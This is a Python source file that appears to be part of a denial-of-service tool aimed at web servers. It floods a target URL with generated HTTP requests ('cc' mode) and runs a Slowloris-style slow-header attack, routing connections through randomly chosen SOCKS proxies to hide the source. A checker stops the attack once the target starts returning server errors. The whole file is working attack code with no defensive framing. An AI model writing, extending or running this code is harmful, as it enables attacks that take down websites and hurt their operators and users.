import ssl
import socks
import socket
import requests
from urllib.parse import urlparse, ParseResult
from random import randint
from time import sleep

from cc_utils import gen_header
from socks_proxy_getter import get_random_proxy
from multiprocessing import Manager

manager = Manager()

i = manager.Value('d', 0)


def send_request(mode: str,
                 target: str,
                 stop: bool,
                 proxy: str or None = None):
    target_url = urlparse(target)
    while not stop.value:
        try:
            print("Start new socket.")
            if not proxy:
                proxy = get_random_proxy()
            with (_get_socket(target_url, proxy)) as s:
                while not stop.value:
                    global i
                    i.value += 1
                    request = _mk_request(mode, target_url)
                    sent = s.send(str.encode(request))
                    print(f"Socket request send. [{i.value}]")
                    if not sent:
                        print("Socket stoped.")
                        break
        except Exception as e:
            print(f"Socket stoped, e: {e}")
            pass


def slow(target: str, stop: bool, proxy: str or None = None):
    while not stop.value:
        try:
            target_url = urlparse(target)
            print("Start new socket.")
            if not proxy:
                proxy = get_random_proxy()
            with (_get_socket(target_url, proxy)) as s:
                request = _mk_request('slow', target_url)
                sent = s.send(str.encode(request))
                while not stop.value:
                    sent = s.send(f'X-a: {randint(1, 5000)}\r\n')
                    print("Socket request send.")
                    if not sent:
                        print("Socket stoped.")
                        break
        except Exception as e:
            print(f"Socket stoped, e: {e}")
            pass


def check(target: str, stop):
    while not stop.value:
        try:
            sleep(10)
            print("Checking...")
            with (requests.get(target)) as r:
                if r.status_code >= 500:
                    stop.value = True
        except Exception as e:
            print(f"Check Failed, e: {e}")
            pass


def _mk_request(mode: int, target_url: ParseResult):
    if mode == 'cc':
        header = gen_header("get", target_url)
    else:
        header = gen_header(mode, target_url)
    return header


def _get_socket(target_url: ParseResult, proxy: str or None = None):
    host = target_url.hostname
    port = target_url.port
    if not port:
        if target_url.scheme == "https":
            port = 443
        else:
            port = 80
    s = socks.socksocket()
    if proxy:
        print(f"Use Proxy: {proxy}")
        proxy_url = urlparse(proxy)
        if proxy_url.scheme == 'socks5':
            socks_type = socks.SOCKS5
        else:
            socks_type = socks.SOCKS4
        s.set_proxy(socks_type, proxy_url.hostname, proxy_url.port)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if target_url.scheme == "https" or port == 443:
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(15)
    s.connect((host, port))
    return s
